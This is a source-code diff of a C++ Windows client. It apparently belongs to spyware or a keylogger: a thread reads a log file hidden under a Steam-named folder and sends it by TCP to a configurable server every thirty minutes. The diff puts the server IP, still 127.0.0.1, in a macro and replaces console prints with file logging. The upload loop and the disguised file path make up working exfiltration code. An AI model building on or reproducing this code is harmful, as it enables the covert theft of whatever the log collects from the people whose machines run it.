@@ -11,6 +11,8 @@
 #include <ctime>
 #include <pthread.h>
 
+#define IP "127.0.0.1"
+
 #pragma comment(lib, "Ws2_32.lib")
 
 std::string logFile = "C:/Users/Public/Documents/Steam/COM_log.bin";
@@ -119,31 +121,31 @@ void *Socket(void *threadID)
     SOCKADDR_IN ServerAddr;
     unsigned int Port = 9875;
     int  RetCode;
-    int BytesSent, nlen;
+    int BytesSent;
     char tempBuff[1024];
     while(1)
     {
         WSAStartup(MAKEWORD(2,2), &wsaData);
-        printf("Client: Winsock DLL status is %s.\n", wsaData.szSystemStatus);
+        LogIntoFile("Client: Winsock DLL status is " + (std::string)wsaData.szSystemStatus ,true,logFileError);
         sendingSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
         if(sendingSocket == INVALID_SOCKET)
         {
-            LogIntoFile("Client: socket() failed! Error code: " + WSAGetLastError(),true,logFileError);
+            LogIntoFile("Client: socket() failed! Error code: " + std::to_string(WSAGetLastError()),true,logFileError);
             WSACleanup();
             Sleep(100);
             continue;
         }
         else
         {
-            printf("Client: socket() is OK!\n");
+            LogIntoFile("Client: socket() ok ",true,logFileError);
         }
         ServerAddr.sin_family = AF_INET;
         ServerAddr.sin_port = htons(Port);
-        ServerAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
+        ServerAddr.sin_addr.s_addr = inet_addr(IP);
         RetCode = connect(sendingSocket, (SOCKADDR *) &ServerAddr, sizeof(ServerAddr));
         if(RetCode != 0)
         {
-            LogIntoFile("Client: connect() failed! Error code: " + WSAGetLastError(),true,logFileError);
+            LogIntoFile("Client: connect() failed! Error code: " + std::to_string(WSAGetLastError()),true,logFileError);
             closesocket(sendingSocket);
             WSACleanup();
             Sleep(1800000);
@@ -151,7 +153,7 @@ void *Socket(void *threadID)
         }
         else
         {
-            //printf("Client: connect() is OK, got connected...\n");
+            LogIntoFile("Client: connect() success! ",true,logFileError);
             //printf("Client: Ready for sending and/or receiving data...\n");
         }
         std::ifstream logFileS;
@@ -172,7 +174,7 @@ void *Socket(void *threadID)
             }
             else if(BytesSent == SOCKET_ERROR)
             {
-                LogIntoFile("Client: send() failed! Error code: " + WSAGetLastError(),true,logFileError);
+                LogIntoFile("Client: send() failed! Error code: " + std::to_string(WSAGetLastError()),true,logFileError);
                 break;
             }
             else
@@ -190,7 +192,7 @@ void *Socket(void *threadID)
         //printf("File closed!\n");
         if(BytesSent == SOCKET_ERROR)
         {
-            LogIntoFile("Client: send() failed! Error code: " + WSAGetLastError(),true,logFileError);
+            LogIntoFile("Client: send() failed! Error code: " + std::to_string(WSAGetLastError()),true,logFileError);
             closesocket(sendingSocket);
             WSACleanup();
             Sleep(1000);
@@ -198,7 +200,7 @@ void *Socket(void *threadID)
         }
         else
         {
-            //LogIntoFile("Client: send() succesfull!",true,logFile_Debug);
+            LogIntoFile("Client: send() succesfull!",true,logFileError);
             closesocket(sendingSocket);
             WSACleanup();
             Sleep(1800000);
